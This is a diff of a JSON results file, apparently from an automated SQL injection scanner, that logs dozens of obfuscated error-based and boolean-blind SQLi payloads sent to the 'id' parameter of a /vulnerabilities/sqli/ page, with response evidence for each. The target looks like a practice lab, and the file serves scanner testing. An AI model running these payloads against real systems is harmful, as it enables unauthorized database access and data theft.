-        "payload_value": "'/**/oR/**/1=(sElEcT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62)))/**/FROM/**/DUAL)/**/aNd/**/CHR(118)||CHR(117)||CHR(110)='vun",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0155,
+        "response_time": 0.0126,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -894,9 +872,54 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0294,
+        "response_time": 0.0154,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/1=(sElEcT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62)))/**/FROM/**/DUAL)/**/aNd/**/CHR(118)||CHR(117)||CHR(110)='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0277,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/1=1/**/aNd/**/0x76756e/**/LIKE/**/'vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0117,
+        "analysis_details": [
+          "[Boolean] Content length changed by 473 bytes",
+          "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
       }
@@ -916,7 +939,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.014,
+        "response_time": 0.0301,
         "analysis_details": [
           "[Boolean] Content length changed by 418 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -939,7 +962,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0433,
+        "response_time": 0.0318,
         "analysis_details": [
           "[Boolean] Content length changed by 513 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -962,7 +985,30 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0603,
+        "response_time": 0.039,
+        "analysis_details": [
+          "[Boolean] Content length changed by 408 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/1=1/**/oR/**/'vun1'='vun2",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0391,
         "analysis_details": [
           "[Boolean] Content length changed by 408 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -985,7 +1031,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0196,
+        "response_time": 0.014,
         "analysis_details": [
           "[Boolean] Content length changed by 513 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -1008,7 +1054,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0611,
+        "response_time": 0.0179,
         "analysis_details": [
           "[Boolean] Content length changed by 923 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -1024,29 +1070,6 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/1=1/**/aNd/**/0x76756e/**/LIKE/**/'vun",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0605,
-        "analysis_details": [
-          "[Boolean] Content length changed by 473 bytes",
-          "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
         "payload_value": "'/**/oR/**/1=1/**/oR/**/'vun1'='vun2",
         "type": "SQLi-boolean_blind",
         "severity": "High",
@@ -1054,7 +1077,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0236,
+        "response_time": 0.02,
         "analysis_details": [
           "[Boolean] Content length changed by 408 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -1070,37 +1093,14 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/1=1/**/oR/**/'vun1'='vun2",
+        "payload_value": "'/**/oR/**/cAsE/**/wHeN/**/1=1/**/THEN/**/1/**/ELSE/**/JSON(x'76756e')/**/END/**/aNd/**/x'76756e'='vun",
         "type": "SQLi-boolean_blind",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0329,
-        "analysis_details": [
-          "[Boolean] Content length changed by 408 bytes",
-          "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/0x76756e='vun",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.019,
+        "response_time": 0.0127,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -1122,7 +1122,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0298,
+        "response_time": 0.0155,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -1144,7 +1144,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0412,
+        "response_time": 0.0164,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -1159,16 +1159,86 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/cAsE/**/wHeN/**/1=1/**/THEN/**/1/**/ELSE/**/JSON(x'76756e')/**/END/**/aNd/**/x'76756e'='vun",
+        "payload_value": "'/**/oR/**/ELT(1=1,1)/**/aNd/**/0x76756e='vun",
         "type": "SQLi-boolean_blind",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0413,
+        "response_time": 0.0144,
         "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+          "[Boolean] Content length changed by 453 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/ELT(1=1,1)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0113,
+        "analysis_details": [
+          "[Boolean] Content length changed by 508 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/EXTRACTVALUE(1,cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0x3A/**/END)/**/oR/**/'vun1'='vun2",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0231,
+        "analysis_details": [
+          "[Boolean] Content length changed by 758 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/aNd/**/0x76756e='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0171,
+        "analysis_details": [
+          "[Boolean] Content length changed by 4474 bytes",
+          "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
       }
@@ -1188,73 +1258,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.058,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/0x76756e='vun",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.058,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/oR/**/'vun1'='vun2",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0579,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/0x76756e/**/LIKE/**/'vun",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0579,
+        "response_time": 0.0302,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -1276,7 +1280,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0577,
+        "response_time": 0.0372,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -1291,62 +1295,127 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/EXTRACTVALUE(1,cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0x3A/**/END)/**/oR/**/'vun1'='vun2",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0403,
-        "analysis_details": [
-          "[Boolean] Content length changed by 758 bytes",
-          "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/ELT(1=1,1)/**/aNd/**/0x76756e='vun",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0287,
-        "analysis_details": [
-          "[Boolean] Content length changed by 453 bytes",
-          "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/oR/**/'vun1'='vun2",
+        "payload_value": "'/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/0x76756e='vun",
         "type": "SQLi-error_based",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0212,
+        "response_time": 0.0464,
         "analysis_details": [
-          "[Boolean] Content length changed by 4474 bytes",
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/oR/**/'vun1'='vun2",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0464,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/0x76756e/**/LIKE/**/'vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0463,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/aNd/**/0x76756e='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0463,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/EXTRACTVALUE(1,cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0x3A/**/END)/**/aNd/**/0x76756e='vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0388,
+        "analysis_details": [
+          "[Boolean] Content length changed by 768 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/NOT/**/1=1/**/oR/**/'vun1'='vun2",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0367,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -1367,7 +1436,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0168,
+        "response_time": 0.0208,
         "analysis_details": [
           "[Boolean] Content length changed by 443 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -1383,62 +1452,39 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/aNd/**/0x76756e='vun",
+        "payload_value": "'/**/oR/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/oR/**/'vun1'='vun2",
         "type": "SQLi-error_based",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0881,
-        "analysis_details": [
-          "[Boolean] Content length changed by 4471 bytes",
-          "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0883,
-        "analysis_details": [
-          "[Boolean] Content length changed by 4471 bytes",
-          "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/aNd/**/0x76756e='vun",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0131,
+        "response_time": 0.0392,
         "analysis_details": [
           "[Boolean] Content length changed by 4474 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/NOT/**/1=1/**/oR/**/'vun1'='vun2",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0253,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -1459,7 +1505,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0261,
+        "response_time": 0.0291,
         "analysis_details": [
           "[Boolean] Content length changed by 4474 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -1475,14 +1521,58 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/NOT/**/1=1/**/oR/**/'vun1'='vun2",
+        "payload_value": "'/**/oR/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/0x76756e='vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0608,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0624,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/NOT/**/1=1/**/aNd/**/0x76756e='vun",
         "type": "SQLi-boolean_blind",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0884,
+        "response_time": 0.0708,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -1498,85 +1588,16 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/EXTRACTVALUE(1,cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0x3A/**/END)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
-        "type": "SQLi-boolean_blind",
+        "payload_value": "'/**/oR/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/aNd/**/0x76756e='vun",
+        "type": "SQLi-error_based",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0404,
+        "response_time": 0.0706,
         "analysis_details": [
-          "[Boolean] Content length changed by 823 bytes",
-          "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/ELT(1=1,1)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0132,
-        "analysis_details": [
-          "[Boolean] Content length changed by 508 bytes",
-          "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/MAKE_SET(1=1,1)/**/aNd/**/0x76756e='vun",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0574,
-        "analysis_details": [
-          "[Boolean] Content length changed by 478 bytes",
-          "[Verified] Logic Swapping (True!=False)"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/MAKE_SET(1=1,1)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
-        "type": "SQLi-boolean_blind",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0575,
-        "analysis_details": [
-          "[Boolean] Content length changed by 533 bytes",
+          "[Boolean] Content length changed by 4471 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -1597,7 +1618,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0575,
+        "response_time": 0.071,
         "analysis_details": [
           "[Boolean] Content length changed by 468 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -1613,16 +1634,16 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/NOT/**/1=1/**/aNd/**/0x76756e/**/LIKE/**/'vun",
+        "payload_value": "'/**/oR/**/MAKE_SET(1=1,1)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
         "type": "SQLi-boolean_blind",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0701,
+        "response_time": 0.0712,
         "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
+          "[Boolean] Content length changed by 533 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -1636,16 +1657,16 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/NOT/**/1=1/**/aNd/**/0x76756e='vun",
+        "payload_value": "'/**/oR/**/EXTRACTVALUE(1,cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0x3A/**/END)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
         "type": "SQLi-boolean_blind",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0885,
+        "response_time": 0.0479,
         "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
+          "[Boolean] Content length changed by 823 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -1659,16 +1680,16 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/NOT/**/1=1/**/oR/**/'vun1'='vun2",
-        "type": "SQLi-boolean_blind",
+        "payload_value": "'/**/oR/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/oR/**/'vun1'='vun2",
+        "type": "SQLi-error_based",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0885,
+        "response_time": 0.0704,
         "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
+          "[Boolean] Content length changed by 4471 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -1689,7 +1710,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0886,
+        "response_time": 0.0707,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -1705,16 +1726,16 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/EXTRACTVALUE(1,cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0x3A/**/END)/**/aNd/**/0x76756e='vun",
